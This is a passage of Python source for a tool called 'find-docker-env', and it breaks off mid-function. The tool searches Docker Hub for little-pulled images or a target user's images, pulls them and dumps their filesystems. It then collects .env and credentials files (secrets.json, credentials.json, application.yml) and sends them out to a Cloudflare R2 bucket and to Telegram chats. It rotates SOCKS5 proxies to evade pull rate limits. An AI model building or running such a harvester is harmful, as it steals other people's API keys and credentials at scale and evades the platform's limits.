import argparse
import csv
import json
import mimetypes
import os
import re
import shutil
import ssl
import sqlite3
import subprocess
import sys
import tempfile
import threading
import time
import uuid
from concurrent.futures import ThreadPoolExecutor, as_completed
from dataclasses import dataclass
from datetime import datetime, timezone
from pathlib import Path
from typing import Any
from urllib import parse, request
from urllib.error import HTTPError, URLError

try:
    import boto3
except ImportError:
    boto3 = None

try:
    from dotenv import load_dotenv
except ImportError:
    def load_dotenv() -> bool:
        return False


DOCKER_HUB_SEARCH_URL = "https://hub.docker.com/v2/search/repositories/"
DOCKER_HUB_TAGS_URL = "https://hub.docker.com/v2/namespaces/{namespace}/repositories/{name}/tags"
DOCKER_HUB_NAMESPACE_REPOSITORIES_URL = "https://hub.docker.com/v2/namespaces/{namespace}/repositories"
DOCKER_HUB_LEGACY_NAMESPACE_REPOSITORIES_URL = "https://hub.docker.com/v2/repositories/{namespace}"
MANAGED_CONTAINER_LABEL = "find-docker-env.managed=true"
_IMAGE_USAGE_LOCK = threading.Lock()
_IMAGE_USAGE_COUNTS: dict[str, int] = {}
_KNOWN_IMAGE_IDS: set[str] = set()
_DB_LOCK = threading.Lock()
_PROXY_STATE_LOCK = threading.Lock()
_DOCKER_CLEANUP_LOCK = threading.Lock()
SENSITIVE_FILE_NAMES = {
    "config.json",
    "application.yml",
    "application.yaml",
    "config.yaml",
    "secrets.json",
    "credentials.json",
}
ENV_EXCLUDED_NAMES = {
    ".env.example",
    ".env.sample",
    ".env.template",
    ".env.dist",
}


@dataclass(slots=True)
class AppConfig:
    db_path: Path
    rate_limit_wait_hours: float
    telegram_bot_token: str | None
    telegram_admin_ids: list[str]
    proxy_file_path: Path = Path("proxies.txt")
    proxy_state_path: Path = Path("proxy_state.json")
    r2_endpoint_url: str | None = None
    r2_access_key_id: str | None = None
    r2_secret_access_key: str | None = None
    r2_bucket_name: str | None = None
    r2_bucket_prefix: str = ""
    insecure_network: bool = False


@dataclass(slots=True)
class RepositoryCandidate:
    name: str
    namespace: str
    repository_type: str
    pull_count: int
    description: str

    @property
    def image(self) -> str:
        return f"{self.namespace}/{self.name}"


@dataclass(slots=True)
class ScanResult:
    image: str
    pull_count: int
    temp_dir: Path | None
    files_copied: bool
    env_found: bool
    status: str
    env_source: Path | None = None
    env_saved_to: Path | None = None
    matched_files: list[Path] | None = None
    saved_files: list[Path] | None = None
    error: str | None = None


def load_config() -> AppConfig:
    load_dotenv()

    db_path = Path(parse_env_value("DB_PATH", "state.db"))
    rate_limit_wait_hours = float(parse_env_value("RATE_LIMIT_WAIT_HOURS", "6"))
    telegram_bot_token = parse_env_value("TELEGRAM_BOT_TOKEN", "").strip() or None
    admin_ids_raw = parse_env_value("TELEGRAM_ADMIN_IDS", "")
    telegram_admin_ids = [item.strip() for item in admin_ids_raw.split(",") if item.strip()]
    r2_bucket_prefix = parse_env_value("R2_BUCKET_PREFIX", "").strip().strip("/")

    return AppConfig(
        db_path=db_path,
        rate_limit_wait_hours=rate_limit_wait_hours,
        telegram_bot_token=telegram_bot_token,
        telegram_admin_ids=telegram_admin_ids,
        proxy_file_path=Path(parse_env_value("PROXY_FILE_PATH", "proxies.txt")),
        proxy_state_path=Path(parse_env_value("PROXY_STATE_PATH", "proxy_state.json")),
        r2_endpoint_url=parse_env_value("R2_ENDPOINT_URL", "").strip() or None,
        r2_access_key_id=parse_env_value("R2_ACCESS_KEY_ID", "").strip() or None,
        r2_secret_access_key=parse_env_value("R2_SECRET_ACCESS_KEY", "").strip() or None,
        r2_bucket_name=parse_env_value("R2_BUCKET_NAME", "").strip() or None,
        r2_bucket_prefix=r2_bucket_prefix,
    )


def parse_env_value(name: str, default: str) -> str:
    return str(os.environ.get(name, default))


def extract_image_parts(item: dict[str, Any]) -> tuple[str | None, str | None]:
    raw_name = item.get("repo_name") or item.get("name")
    raw_owner = item.get("repo_owner") or item.get("namespace")

    if raw_name and "/" in raw_name:
        namespace, name = raw_name.split("/", 1)
        return namespace, name

    if raw_owner and raw_name:
        return raw_owner, raw_name

    if raw_name and item.get("is_official"):
        return "library", raw_name

    return None, None


def make_safe_image_name(image: str) -> str:
    return re.sub(r"[^A-Za-z0-9._-]+", "_", image)


def parse_args() -> argparse.Namespace:
    parser = argparse.ArgumentParser(
        description=(
            "Search Docker Hub repositories, run matching images one by one, "
            "copy the full container filesystem into a temporary directory and check whether it contains a .env file."
        )
    )
    target_group = parser.add_mutually_exclusive_group(required=True)
    target_group.add_argument("query", nargs="?", help="Search query for Docker Hub.")
    target_group.add_argument(
        "--user-images",
        dest="user_images",
        help="Scan repositories that belong to a specific Docker Hub user or namespace.",
    )
    target_group.add_argument(
        "--probe-user-endpoints",
        dest="probe_user_endpoints",
        help="Probe Docker Hub repository-list endpoints for a specific user or namespace and print diagnostics.",
    )
    parser.add_argument(
        "--max-results",
        type=int,
        default=10,
        help="Maximum number of repositories to inspect after filtering by pull count. Default: 10.",
    )
    parser.add_argument(
        "--max-pulls",
        type=int,
        default=500,
        help="Only inspect repositories with pull_count lower than this value. Default: 500.",
    )
    parser.add_argument(
        "--page-size",
        type=int,
        default=100,
        help="Docker Hub search page size. Default: 100.",
    )
    parser.add_argument(
        "--max-pages",
        type=int,
        default=20,
        help="Maximum number of Docker Hub search pages to inspect. Default: 20.",
    )
    parser.add_argument(
        "--start-timeout",
        type=float,
        default=8.0,
        help="Seconds to wait after container start before stopping it. Default: 8.",
    )
    parser.add_argument(
        "--keep-temp",
        action="store_true",
        help="Keep temporary directories with copied /app content.",
    )
    parser.add_argument(
        "--start-from-image",
        help="Start scanning from this repository image name, for example owner/repo.",
    )
    parser.add_argument(
        "--start-from-index",
        type=int,
        default=1,
        help="Start scanning from this 1-based position in the found repository list. Default: 1.",
    )
    parser.add_argument(
        "--workers",
        type=int,
        default=1,
        help="Number of images to scan in parallel. Default: 1.",
    )
    parser.add_argument(
        "--ignore-db",
        action="store_true",
        help="Ignore processed_images database checks and scan all matched images.",
    )
    parser.add_argument(
        "--report-file",
        help="Path to save the report. Supported extensions: .json, .csv.",
    )
    parser.add_argument(
        "--result-dir",
        default="result",
        help="Directory where found .env files will be copied. Default: result.",
    )
    parser.add_argument(
        "--output-json",
        action="store_true",
        help="Print results as JSON.",
    )
    parser.add_argument(
        "--insecure",
        action="store_true",
        help="Disable TLS certificate verification for Docker Hub requests.",
    )
    return parser.parse_args()


def fetch_search_page(query: str, page: int, page_size: int, insecure: bool = False) -> dict[str, Any]:
    params = parse.urlencode(
        {
            "query": query,
            "page": page,
            "page_size": page_size,
            "ordering": "-last_updated",
        }
    )
    req = request.Request(
        f"{DOCKER_HUB_SEARCH_URL}?{params}",
        headers={
            "Accept": "application/json",
            "User-Agent": "find-docker-env/1.0",
        },
    )
    context = ssl._create_unverified_context() if insecure else None
    with request.urlopen(req, timeout=20, context=context) as response:
        return json.load(response)


def fetch_tags_page(namespace: str, name: str, page_size: int = 25, insecure: bool = False) -> dict[str, Any]:
    params = parse.urlencode(
        {
            "page_size": page_size,
            "ordering": "last_updated",
        }
    )
    req = request.Request(
        f"{DOCKER_HUB_TAGS_URL.format(namespace=namespace, name=name)}?{params}",
        headers={
            "Accept": "application/json",
            "User-Agent": "find-docker-env/1.0",
        },
    )
    context = ssl._create_unverified_context() if insecure else None
    with request.urlopen(req, timeout=20, context=context) as response:
        return json.load(response)


def fetch_namespace_repositories_page(
    namespace: str,
    page: int,
    page_size: int,
    insecure: bool = False,
) -> dict[str, Any]:
    params = parse.urlencode(
        {
            "page": page,
            "page_size": page_size,
            "ordering": "-last_updated",
        }
    )
    context = ssl._create_unverified_context() if insecure else None
    headers = {
        "Accept": "application/json",
        "User-Agent": "find-docker-env/1.0",
    }

    primary_url = f"{DOCKER_HUB_NAMESPACE_REPOSITORIES_URL.format(namespace=namespace)}?{params}"
    try:
        with request.urlopen(request.Request(primary_url, headers=headers), timeout=20, context=context) as response:
            return json.load(response)
    except HTTPError as exc:
        if exc.code == 404 and page > 1:
            return {"count": 0, "next": None, "previous": None, "results": []}
        if exc.code != 404:
            raise

    legacy_url = f"{DOCKER_HUB_LEGACY_NAMESPACE_REPOSITORIES_URL.format(namespace=namespace)}?{params}"
    try:
        with request.urlopen(request.Request(legacy_url, headers=headers), timeout=20, context=context) as response:
            return json.load(response)
    except HTTPError as exc:
        if exc.code == 404 and page > 1:
            return {"count": 0, "next": None, "previous": None, "results": []}
        if exc.code == 404:
            raise RuntimeError(
                f"Docker Hub namespace '{namespace}' was not found or has no public repositories."
            ) from exc
        raise


def probe_namespace_endpoint(url: str, insecure: bool = False) -> dict[str, Any]:
    context = ssl._create_unverified_context() if insecure else None
    headers = {
        "Accept": "application/json",
        "User-Agent": "find-docker-env/1.0",
    }

    try:
        with request.urlopen(request.Request(url, headers=headers), timeout=20, context=context) as response:
            payload = json.load(response)
        return {
            "url": url,
            "ok": True,
            "status_code": 200,
            "count": int(payload.get("count") or len(payload.get("results", []))),
            "sample_names": [item.get("name") for item in payload.get("results", [])[:5] if item.get("name")],
            "next": payload.get("next"),
        }
    except HTTPError as exc:
        return {
            "url": url,
            "ok": False,
            "status_code": exc.code,
            "error": exc.reason or exc.msg,
        }
    except URLError as exc:
        return {
            "url": url,
            "ok": False,
            "status_code": None,
            "error": str(exc.reason or exc),
        }


def probe_namespace_endpoints(namespace: str, page_size: int, insecure: bool = False) -> list[dict[str, Any]]:
    params = parse.urlencode(
        {
            "page": 1,
            "page_size": page_size,
            "ordering": "-last_updated",
        }
    )
    candidate_urls = [
        f"{DOCKER_HUB_NAMESPACE_REPOSITORIES_URL.format(namespace=namespace)}?{params}",
        f"{DOCKER_HUB_LEGACY_NAMESPACE_REPOSITORIES_URL.format(namespace=namespace)}?{params}",
    ]
    return [probe_namespace_endpoint(url, insecure=insecure) for url in candidate_urls]


def get_image_references(candidate: RepositoryCandidate, insecure: bool = False, limit: int = 10) -> list[str]:
    payload = fetch_tags_page(candidate.namespace, candidate.name, insecure=insecure)
    tags = [item.get("name") for item in payload.get("results", []) if item.get("name")]
    if not tags:
        raise RuntimeError(f"No tags found for {candidate.image}.")
    return [f"{candidate.image}:{tag}" for tag in tags[:limit]]


def search_repositories(
    query: str,
    max_pulls: int,
    max_results: int,
    page_size: int,
    max_pages: int,
    start_page: int = 1,
    insecure: bool = False,
) -> list[RepositoryCandidate]:
    results: list[RepositoryCandidate] = []
    page = max(start_page, 1)
    has_next_page = True
    pages_checked = 0

    while len(results) < max_results and has_next_page and pages_checked < max_pages:
        payload = fetch_search_page(query=query, page=page, page_size=page_size, insecure=insecure)
        raw_items = payload.get("results", [])
        if not raw_items:
            break

        for item in raw_items:
            pull_count = int(item.get("pull_count") or 0)
            if pull_count >= max_pulls:
                continue

            namespace, name = extract_image_parts(item)
            if not namespace or not name:
                continue

            results.append(
                RepositoryCandidate(
                    name=name,
                    namespace=namespace,
                    repository_type=item.get("repo_type", "image"),
                    pull_count=pull_count,
                    description=item.get("short_description") or "",
                )
            )

            if len(results) >= max_results:
                break

        has_next_page = bool(payload.get("next"))
        page += 1
        pages_checked += 1

    return results


def list_namespace_repositories(
    namespace: str,
    max_pulls: int,
    max_results: int,
    page_size: int,
    max_pages: int,
    start_page: int = 1,
    insecure: bool = False,
) -> list[RepositoryCandidate]:
    results: list[RepositoryCandidate] = []
    page = max(start_page, 1)
    has_next_page = True
    pages_checked = 0

    while len(results) < max_results and has_next_page and pages_checked < max_pages:
        payload = fetch_namespace_repositories_page(
            namespace=namespace,
            page=page,
            page_size=page_size,
            insecure=insecure,
        )
        raw_items = payload.get("results", [])
        if not raw_items:
            break

        for item in raw_items:
            pull_count = int(item.get("pull_count") or 0)
            if pull_count >= max_pulls:
                continue

            item_namespace, name = extract_image_parts(
                {
                    "name": item.get("name"),
                    "namespace": item.get("namespace") or namespace,
                }
            )
            if not item_namespace or not name:
                continue

            results.append(
                RepositoryCandidate(
                    name=name,
                    namespace=item_namespace,
                    repository_type=item.get("repository_type", "image"),
                    pull_count=pull_count,
                    description=item.get("description") or item.get("short_description") or "",
                )
            )

            if len(results) >= max_results:
                break

        has_next_page = bool(payload.get("next"))
        page += 1
        pages_checked += 1

    return results


def collect_unprocessed_candidates(
    config: AppConfig,
    query: str | None,
    user_images: str | None,
    max_pulls: int,
    max_results: int,
    page_size: int,
    max_pages: int,
    start_page: int,
    start_from_index: int,
    start_from_image: str | None,
    ignore_db: bool,
    insecure: bool,
) -> list[RepositoryCandidate]:
    collected: list[RepositoryCandidate] = []
    seen_images: set[str] = set()
    current_page = max(start_page, 1)
    pages_checked = 0
    page_offset = calculate_page_offset(start_from_index, page_size)
    apply_initial_offset = True

    while len(collected) < max_results and pages_checked < max_pages:
        if user_images:
            page_candidates = list_namespace_repositories(
                namespace=user_images,
                max_pulls=max_pulls,
                max_results=page_size,
                page_size=page_size,
                max_pages=1,
                start_page=current_page,
                insecure=insecure,
            )
        else:
            page_candidates = search_repositories(
                query=query or "",
                max_pulls=max_pulls,
                max_results=page_size,
                page_size=page_size,
                max_pages=1,
                start_page=current_page,
                insecure=insecure,
            )
        if not page_candidates:
            break

        if apply_initial_offset:
            page_candidates = page_candidates[page_offset:]
            apply_initial_offset = False

        if start_from_image:
            page_candidates = slice_candidates(page_candidates, start_from_index=1, start_from_image=start_from_image)
            start_from_image = None

        for candidate in page_candidates:
            if candidate.image in seen_images:
                continue
            seen_images.add(candidate.image)

            if not ignore_db and is_image_processed(config, candidate.image):
                print(f"Skipping already processed image: {candidate.image}", file=sys.stderr)
                continue

            collected.append(candidate)
            if len(collected) >= max_results:
                break

        current_page += 1
        pages_checked += 1

    return collected


def slice_candidates(
    candidates: list[RepositoryCandidate],
    start_from_index: int = 1,
    start_from_image: str | None = None,
) -> list[RepositoryCandidate]:
    start_index = max(start_from_index, 1) - 1
    sliced = candidates[start_index:]

    if not start_from_image:
        return sliced

    for index, candidate in enumerate(sliced):
        if candidate.image == start_from_image:
            return sliced[index:]

    return []


def calculate_start_page(start_from_index: int, page_size: int) -> int:
    normalized_index = max(start_from_index, 1)
    return ((normalized_index - 1) // page_size) + 1


def calculate_page_offset(start_from_index: int, page_size: int) -> int:
    normalized_index = max(start_from_index, 1)
    return (normalized_index - 1) % page_size


def run_command(args: list[str], check: bool = True) -> subprocess.CompletedProcess[str]:
    return subprocess.run(
        args,
        check=check,
        capture_output=True,
        text=True,
    )


def init_db(config: AppConfig) -> None:
    config.db_path.parent.mkdir(parents=True, exist_ok=True)
    with sqlite3.connect(config.db_path) as conn:
        conn.execute(
            """
            CREATE TABLE IF NOT EXISTS processed_images (
                image TEXT PRIMARY KEY,
                processed_at TEXT NOT NULL,
                found_sensitive_files INTEGER NOT NULL DEFAULT 0
            )
            """
        )
        cursor = conn.cursor()
        try:
            cursor.execute("PRAGMA table_info(processed_images)")
            columns = {row[1] for row in cursor.fetchall()}
        finally:
            cursor.close()
        if "found_sensitive_files" not in columns:
            conn.execute(
                "ALTER TABLE processed_images ADD COLUMN found_sensitive_files INTEGER NOT NULL DEFAULT 0"
            )
        conn.commit()


def is_image_processed(config: AppConfig, image: str) -> bool:
    init_db(config)
    with sqlite3.connect(config.db_path) as conn:
        row = conn.execute("SELECT 1 FROM processed_images WHERE image = ? LIMIT 1", (image,)).fetchone()
    return row is not None


def mark_image_processed(config: AppConfig, image: str, found_sensitive_files: bool = False) -> None:
    init_db(config)
    processed_at = datetime.now(timezone.utc).isoformat()
    with _DB_LOCK:
        with sqlite3.connect(config.db_path) as conn:
            conn.execute(
                """
                INSERT INTO processed_images (image, processed_at, found_sensitive_files)
                VALUES (?, ?, ?)
                ON CONFLICT(image) DO UPDATE SET
                    processed_at = excluded.processed_at,
                    found_sensitive_files = excluded.found_sensitive_files
                """,
                (image, processed_at, int(found_sensitive_files)),
            )
            conn.commit()


def filter_unprocessed_candidates(config: AppConfig, candidates: list[RepositoryCandidate]) -> list[RepositoryCandidate]:
    filtered: list[RepositoryCandidate] = []
    for candidate in candidates:
        if is_image_processed(config, candidate.image):
            print(f"Skipping already processed image: {candidate.image}", file=sys.stderr)
            continue
        filtered.append(candidate)
    return filtered


def should_mark_processed(result: ScanResult) -> bool:
    return result.status not in {"tag_resolve_failed", "pull_failed", "unsupported_manifest"}


def ensure_docker_available() -> None:
    docker_path = shutil.which("docker")
    if not docker_path:
        raise RuntimeError("docker CLI was not found in PATH.")

    try:
        run_command(["docker", "version"], check=True)
    except subprocess.CalledProcessError as exc:
        stderr = exc.stderr.strip() or exc.stdout.strip()
        raise RuntimeError(f"docker is unavailable: {stderr}") from exc


def copy_container_filesystem(container_name: str, destination_root: Path) -> tuple[bool, Path | None, str | None]:
    try:
        run_command(["docker", "cp", f"{container_name}:.", str(destination_root)], check=True)
        return True, destination_root, None
    except subprocess.CalledProcessError as exc:
        stderr = exc.stderr.strip() or exc.stdout.strip()
        return False, None, stderr or "failed to copy container filesystem"


def is_sensitive_file(path: Path) -> bool:
    name = path.name.lower()
    if name.startswith(".env"):
        return name not in ENV_EXCLUDED_NAMES
    return name in SENSITIVE_FILE_NAMES


def find_env_file(directory: Path) -> Path | None:
    matches = find_sensitive_files(directory)
    return matches[0] if matches else None


def find_sensitive_files(directory: Path) -> list[Path]:
    matches: list[Path] = []
    for path in directory.rglob("*"):
        if path.is_file() and is_sensitive_file(path):
            matches.append(path)
    return sorted(matches)


def contains_env_file(directory: Path) -> bool:
    return bool(find_sensitive_files(directory))


def cleanup_container(container_name: str) -> None:
    run_command(["docker", "rm", "-f", "-v", container_name], check=False)


def inspect_container_image_id(container_name: str) -> str | None:
    result = run_command(["docker", "inspect", "-f", "{{.Image}}", container_name], check=False)
    if result.returncode != 0:
        return None

    image_id = result.stdout.strip()
    return image_id or None


def register_image_usage(image_id: str) -> None:
    with _IMAGE_USAGE_LOCK:
        _IMAGE_USAGE_COUNTS[image_id] = _IMAGE_USAGE_COUNTS.get(image_id, 0) + 1
        _KNOWN_IMAGE_IDS.add(image_id)


def cleanup_image(image_id: str) -> None:
    should_remove = False
    with _IMAGE_USAGE_LOCK:
        usage_count = _IMAGE_USAGE_COUNTS.get(image_id)
        if usage_count is None:
            should_remove = True
        elif usage_count <= 1:
            _IMAGE_USAGE_COUNTS.pop(image_id, None)
            should_remove = True
        else:
            _IMAGE_USAGE_COUNTS[image_id] = usage_count - 1

    if should_remove:
        run_command(["docker", "image", "rm", "-f", image_id], check=False)
        with _IMAGE_USAGE_LOCK:
            _KNOWN_IMAGE_IDS.discard(image_id)


def classify_pull_error(error: str) -> str:
    normalized = error.lower()
    if "manifest.v1+prettyjws" in normalized or "no longer supported since containerd" in normalized:
        return "unsupported_manifest"
    if "no space left on device" in normalized:
        return "disk_full"
    return "pull_failed"


def is_rate_limit_error(error: str) -> bool:
    normalized = error.lower()
    return "unauthenticated pull rate limit" in normalized or "increase-rate-limit" in normalized


def is_disk_full_error(error: str) -> bool:
    return "no space left on device" in error.lower()


def format_wait_duration(hours: float) -> str:
    total_minutes = max(int(hours * 60), 1)
    wait_hours, wait_minutes = divmod(total_minutes, 60)
    if wait_hours and wait_minutes:
        return f"{wait_hours}h {wait_minutes}m"
    if wait_hours:
        return f"{wait_hours}h"
    return f"{wait_minutes}m"


def validate_socks5_proxy(raw_value: str) -> str | None:
    value = raw_value.strip()
    if not value:
        return None

    parsed = parse.urlsplit(value)
    if parsed.scheme not in {"socks5", "socks5h"}:
        return None
    if not parsed.hostname or not parsed.port:
        return None
    return value


def load_and_clean_proxies(config: AppConfig) -> list[str]:
    if not config.proxy_file_path.exists():
        return []

    lines = config.proxy_file_path.read_text(encoding="utf-8").splitlines()
    valid_proxies: list[str] = []
    changed = False

    for line in lines:
        candidate = validate_socks5_proxy(line)
        if candidate:
            valid_proxies.append(candidate)
        elif line.strip():
            changed = True

    if changed:
        content = "\n".join(valid_proxies)
        if content:
            content += "\n"
        config.proxy_file_path.write_text(content, encoding="utf-8")

    return valid_proxies


def load_proxy_state(config: AppConfig) -> dict[str, Any]:
    if not config.proxy_state_path.exists():
        return {"active_index": 0, "proxies": []}

    try:
        return json.loads(config.proxy_state_path.read_text(encoding="utf-8"))
    except json.JSONDecodeError:
        return {"active_index": 0, "proxies": []}


def save_proxy_state(config: AppConfig, proxies: list[str], active_index: int) -> None:
    config.proxy_state_path.parent.mkdir(parents=True, exist_ok=True)
    state = {
        "active_index": max(active_index, 0),
        "proxies": proxies,
        "updated_at": datetime.now(timezone.utc).isoformat(),
    }
    config.proxy_state_path.write_text(json.dumps(state, indent=2, ensure_ascii=False), encoding="utf-8")


def sync_proxy_state(config: AppConfig) -> list[str]:
    with _PROXY_STATE_LOCK:
        proxies = load_and_clean_proxies(config)
        state = load_proxy_state(config)
        active_index = int(state.get("active_index", 0) or 0)
        if proxies:
            active_index = min(active_index, len(proxies) - 1)
        else:
            active_index = 0
        save_proxy_state(config, proxies, active_index)
    return proxies


def get_active_proxy(config: AppConfig) -> str | None:
    proxies = sync_proxy_state(config)
    if not proxies:
        return None
    state = load_proxy_state(config)
    active_index = int(state.get("active_index", 0) or 0)
    if active_index >= len(proxies):
        active_index = 0
    return proxies[active_index]


def rotate_proxy(config: AppConfig) -> tuple[str | None, bool]:
    with _PROXY_STATE_LOCK:
        proxies = load_and_clean_proxies(config)
        if not proxies:
            save_proxy_state(config, [], 0)
            return None, True

        state = load_proxy_state(config)
        current_index = int(state.get("active_index", 0) or 0)
        next_index = (current_index + 1) % len(proxies)
        wrapped = next_index == 0
        save_proxy_state(config, proxies, next_index)
        return proxies[next_index], wrapped


def send_telegram_form_request(
    config: AppConfig,
    method: str,
    fields: dict[str, str],
) -> tuple[bool, str | None]:
    api_url = f"https://api.telegram.org/bot{config.telegram_bot_token}/{method}"
    payload = parse.urlencode(fields).encode()
    req = request.Request(api_url, data=payload, method="POST")
    context = ssl._create_unverified_context() if config.insecure_network else None
    try:
        with request.urlopen(req, timeout=20, context=context) as response:
            body = response.read().decode("utf-8", errors="replace")
        return True, body
    except HTTPError as exc:
        details = exc.read().decode("utf-8", errors="replace")
        return False, f"HTTP {exc.code}: {details}"
    except URLError as exc:
        return False, str(exc)


def build_multipart_body(
    fields: dict[str, str],
    files: list[tuple[str, Path, str | None]],
) -> tuple[bytes, str]:
    boundary = f"----FindDockerEnv{uuid.uuid4().hex}"
    chunks: list[bytes] = []

    for name, value in fields.items():
        chunks.extend(
            [
                f"--{boundary}\r\n".encode(),
                f'Content-Disposition: form-data; name="{name}"\r\n\r\n'.encode(),
                value.encode("utf-8"),
                b"\r\n",
            ]
        )

    for field_name, file_path, content_type in files:
        guessed_type = content_type or mimetypes.guess_type(file_path.name)[0] or "application/octet-stream"
        chunks.extend(
            [
                f"--{boundary}\r\n".encode(),
                (
                    f'Content-Disposition: form-data; name="{field_name}"; '
                    f'filename="{file_path.name}"\r\n'
                ).encode(),
                f"Content-Type: {guessed_type}\r\n\r\n".encode(),
                file_path.read_bytes(),
                b"\r\n",
            ]
        )

    chunks.append(f"--{boundary}--\r\n".encode())
    return b"".join(chunks), boundary


def send_telegram_multipart_request(
    config: AppConfig,
    method: str,
    fields: dict[str, str],
    files: list[tuple[str, Path, str | None]],
) -> tuple[bool, str | None]:
    api_url = f"https://api.telegram.org/bot{config.telegram_bot_token}/{method}"
    body, boundary = build_multipart_body(fields, files)
    req = request.Request(
        api_url,
        data=body,
        method="POST",
        headers={"Content-Type": f"multipart/form-data; boundary={boundary}"},
    )
    context = ssl._create_unverified_context() if config.insecure_network else None
    try:
        with request.urlopen(req, timeout=60, context=context) as response:
            payload = response.read().decode("utf-8", errors="replace")
        return True, payload
    except HTTPError as exc:
        details = exc.read().decode("utf-8", errors="replace")
        return False, f"HTTP {exc.code}: {details}"
    except URLError as exc:
        return False, str(exc)


def send_telegram_message(config: AppConfig, text: str) -> None:
    if not config.telegram_bot_token or not config.telegram_admin_ids:
        return

    for admin_id in config.telegram_admin_ids:
        ok, error = send_telegram_form_request(
            config,
            "sendMessage",
            {"chat_id": admin_id, "text": text},
        )
        if not ok and error:
            print(f"Telegram sendMessage failed for chat {admin_id}: {error}", file=sys.stderr)


def chunk_paths(paths: list[Path], chunk_size: int) -> list[list[Path]]:
    return [paths[index:index + chunk_size] for index in range(0, len(paths), chunk_size)]


def build_r2_key(config: AppConfig, image: str, name: str = "") -> str:
    image_prefix = make_safe_image_name(image)
    parts = [part for part in [config.r2_bucket_prefix, image_prefix, name] if part]
    return "/".join(parts)


def get_r2_client(config: AppConfig):
    if not (
        config.r2_endpoint_url
        and config.r2_access_key_id
        and config.r2_secret_access_key
        and config.r2_bucket_name
    ):
        return None
    if boto3 is None:
        print("Cloudflare R2 upload skipped: boto3 is not installed.", file=sys.stderr)
        return None

    session = boto3.session.Session()
    return session.client(
        "s3",
        endpoint_url=config.r2_endpoint_url,
        aws_access_key_id=config.r2_access_key_id,
        aws_secret_access_key=config.r2_secret_access_key,
        region_name="auto",
    )


def upload_files_to_r2(config: AppConfig, image: str, saved_files: list[Path]) -> None:
    if not saved_files:
        return

    client = get_r2_client(config)
    if client is None:
        return

    folder_key = build_r2_key(config, image) + "/"
    try:
        client.put_object(Bucket=config.r2_bucket_name, Key=folder_key, Body=b"")
        for path in saved_files:
            client.upload_file(str(path), config.r2_bucket_name, build_r2_key(config, image, path.name))
    except Exception as exc:
        print(f"Cloudflare R2 upload failed for {image}: {exc}", file=sys.stderr)


def send_telegram_file_groups(config: AppConfig, image: str, saved_files: list[Path]) -> None:
    if not config.telegram_bot_token or not config.telegram_admin_ids or not saved_files:
        return

    caption_base = f"Image: {image}"
    file_groups = chunk_paths(saved_files, 10)

    for admin_id in config.telegram_admin_ids:
        for group_index, group in enumerate(file_groups, start=1):
            media: list[dict[str, str]] = []
            multipart_files: list[tuple[str, Path, str | None]] = []

            for file_index, file_path in enumerate(group):
                attachment_name = f"file{file_index}"
                media_item: dict[str, str] = {
                    "type": "document",
                    "media": f"attach://{attachment_name}",
                }
                if file_index == 0:
                    if len(file_groups) == 1:
                        media_item["caption"] = caption_base
                    else:
                        media_item["caption"] = f"{caption_base} (group {group_index}/{len(file_groups)})"
                media.append(media_item)
                multipart_files.append((attachment_name, file_path, None))

            ok, error = send_telegram_multipart_request(
                config,
                "sendMediaGroup",
                {
                    "chat_id": admin_id,
                    "media": json.dumps(media, ensure_ascii=False),
                },
                multipart_files,
            )
            if not ok and error:
                print(f"Telegram sendMediaGroup failed for chat {admin_id}: {error}", file=sys.stderr)


def pause_on_rate_limit(config: AppConfig, image_reference: str) -> None:
    wait_text = format_wait_duration(config.rate_limit_wait_hours)
    message = f"Pull rate limit reached for {image_reference}. Application paused for {wait_text}."
    print(message, file=sys.stderr)
    send_telegram_message(config, message)
    time.sleep(max(config.rate_limit_wait_hours, 0) * 3600)


def cleanup_docker_storage(config: AppConfig) -> bool:
    with _DOCKER_CLEANUP_LOCK:
        print("Docker storage appears full. Cleaning up scanner-owned Docker resources.", file=sys.stderr)
        send_telegram_message(config, "Docker storage is full. Cleaning up scanner-owned Docker resources.")

        run_command(
            [
                "docker",
                "container",
                "prune",
                "-f",
                "--filter",
                f"label={MANAGED_CONTAINER_LABEL}",
            ],
            check=False,
        )

        with _IMAGE_USAGE_LOCK:
            removable_image_ids = [
                image_id
                for image_id in sorted(_KNOWN_IMAGE_IDS)
                if _IMAGE_USAGE_COUNTS.get(image_id, 0) <= 0
            ]

        cleanup_ok = True
        for image_id in removable_image_ids:
            remove_result = run_command(["docker", "image", "rm", "-f", image_id], check=False)
            if remove_result.returncode == 0:
                with _IMAGE_USAGE_LOCK:
                    _KNOWN_IMAGE_IDS.discard(image_id)
            else:
                cleanup_ok = False

        return cleanup_ok


def has_active_image_usage() -> bool:
    with _IMAGE_USAGE_LOCK:
        return any(count > 0 for count in _IMAGE_USAGE_COUNTS.values())


def handle_rate_limit(config: AppConfig, image_reference: str) -> None:
    active_proxy = get_active_proxy(config)
    next_proxy, wrapped = rotate_proxy(config)

    if next_proxy and not wrapped:
        print(
            f"Pull rate limit reached for {image_reference}. Switching proxy "
            f"from {active_proxy or 'direct'} to {next_proxy}.",
            file=sys.stderr,
        )
        return

    if next_proxy and wrapped:
        print(
            f"All proxies exhausted for {image_reference}. Returning to first proxy {next_proxy}.",
            file=sys.stderr,
        )
    pause_on_rate_limit(config, image_reference)


def choose_pullable_image_reference(
    candidate: RepositoryCandidate,
    config: AppConfig,
    insecure: bool = False,
) -> tuple[str | None, str | None, str | None]:
    last_error: str | None = None
    last_status: str | None = None

    for image_reference in get_image_references(candidate, insecure=insecure):
        disk_cleanup_attempts = 0
        while True:
            pull_result = run_command(["docker", "pull", image_reference], check=False)
            error_text = pull_result.stderr.strip() or pull_result.stdout.strip() or "docker pull failed"
            if pull_result.returncode == 0:
                return image_reference, None, None

            if is_rate_limit_error(error_text):
                handle_rate_limit(config, image_reference)
                continue

            if is_disk_full_error(error_text):
                if disk_cleanup_attempts < 3:
                    disk_cleanup_attempts += 1
                    run_command(["docker", "image", "rm", "-f", image_reference], check=False)
                    cleanup_docker_storage(config)
                    if has_active_image_usage():
                        print(
                            "Docker storage is still busy. Waiting for other workers to release images "
                            f"before retrying pull for {image_reference}.",
                            file=sys.stderr,
                        )
                        time.sleep(2.0)
                    print(f"Retrying pull for {image_reference} after docker storage cleanup.", file=sys.stderr)
                    continue
                return None, "disk_full", error_text

            last_error = error_text
            last_status = classify_pull_error(last_error)
            break

    return None, last_status or "pull_failed", last_error or "docker pull failed"


def copy_found_env(env_path: Path, result_dir: Path, image: str) -> Path:
    result_dir.mkdir(parents=True, exist_ok=True)
    image_dir = result_dir / make_safe_image_name(image)
    image_dir.mkdir(parents=True, exist_ok=True)
    destination = image_dir / env_path.name
    shutil.copy2(env_path, destination)
    return destination


def build_flat_destination(image_dir: Path, original_name: str, sequence_number: int) -> Path:
